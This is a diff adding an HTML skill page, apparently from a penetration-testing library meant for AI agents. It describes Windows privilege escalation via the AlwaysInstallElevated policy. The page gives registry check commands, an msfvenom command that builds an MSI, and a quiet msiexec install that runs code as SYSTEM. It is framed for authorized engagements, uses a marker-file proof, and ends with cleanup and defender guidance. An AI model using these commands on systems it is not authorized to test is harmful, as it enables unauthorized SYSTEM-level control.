@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: alwaysinstallelevated</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>alwaysinstallelevated</h2><div class="meta"><span class="badge gray">privesc</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you have a Windows shell on an authorized engagement</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="privesc-windows.html">privesc-windows</a></div><div class="deps"><span class="kind">requires:</span> <a href="privesc-windows.html">privesc-windows</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="privesc-linux.html">privesc-linux</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>PowerShell</td><td>7.4</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>AlwaysInstallElevated lets any user install MSI packages with SYSTEM privileges when both the machine and user policy keys are set. It is a rare but instant win: one registry check, one MSI, one SYSTEM shell. This skill covers the check and the exploitation on authorized engagements, including building the MSI on your attack box and cleaning up afterward.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Check both registry keys; both must be 1 for the technique to work.</li>
+<li>If set, build a proof MSI on your attack box.</li>
+<li>Transfer the MSI to the target.</li>
+<li>Install it with msiexec and confirm SYSTEM execution.</li>
+<li>Remove the MSI and any artifacts.</li>
+</ol>
+<h2>1. Registry check</h2>
+<pre><code class="language-powershell"># Both keys must exist and equal 1
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# PowerShell equivalent with clear output
+$u = (Get-ItemProperty -Path &#x27;HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer&#x27; -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
+$m = (Get-ItemProperty -Path &#x27;HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer&#x27; -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
+&quot;User: $u  Machine: $m  (both must be 1)&quot;</code></pre>
+<p>If either key is missing or 0, the technique does not apply. Do not try to set the keys yourself: that is persistence and configuration change, not privilege escalation, and it needs separate approval.</p>
+<h2>2. MSI crafting and execution</h2>
+<pre><code class="language-bash"># Build the MSI on your attack box with msfvenom (proof payload first)
+msfvenom -p windows/x64/exec CMD=&#x27;cmd /c echo proof &gt; C:\aiel_proof.txt&#x27; \
+  -f msi -o /tmp/proof.msi
+
+# Transfer to the target (SMB, HTTP, or the engagement&#x27;s file channel)
+# then install quietly:</code></pre>
+<pre><code class="language-powershell"># On the target, install with SYSTEM privileges via the policy
+msiexec /quiet /qn /i C:\Users\test\proof.msi
+
+# Confirm the proof ran as SYSTEM (check file owner or content)
+type C:\aiel_proof.txt
+icacls C:\aiel_proof.txt</code></pre>
+<p>A benign proof (marker file) comes before any shell payload. The finding is proven when the marker exists with SYSTEM ownership.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Only one key is set. The technique fails; report the partial</li>
+<p>configuration as a hardening note, not as an escalation path.</p>
+<li>msiexec is blocked by policy. The technique needs the installer</li>
+<p>service; if it is disabled, note it and move on.</p>
+<li>The MSI install needs a reboot or hangs. Use <code>/quiet /qn</code> and a</li>
+<p>timeout; a hanging installer on production is an availability risk.</p>
+<li>You cannot write the MSI to disk. Check alternate writable paths</li>
+<p>(TEMP, user profile); the MSI must be local for msiexec.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>The policy is not set: move to the other privesc-windows sub-skills;</li>
+<p>this one is binary, it works or it does not.</p>
+<li>You need a full shell, not just proof: rebuild the MSI with the</li>
+<p>approved shell payload only after the proof succeeds.</p>
+<li>Cleanup: uninstall the MSI (<code>msiexec /x</code>), delete the file, and</li>
+<p>verify no service or scheduled artifact remains.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see this as an MSI installed by a non-admin user resulting in SYSTEM processes, which stands out in installer and EDR logs. The fix is simple: do not set AlwaysInstallElevated unless a real deployment need demands it, and scope it as narrowly as possible. Monitoring MSI installations by non-administrators catches abuse of the rare legitimate deployments.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1548.002 (Abuse Elevation Control Mechanism: Bypass User</li>
+<p>Account Control).</p>
+<li>CWE-250 (Execution with Unnecessary Privileges).</li>
+<li>Microsoft documentation on AlwaysInstallElevated policy.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
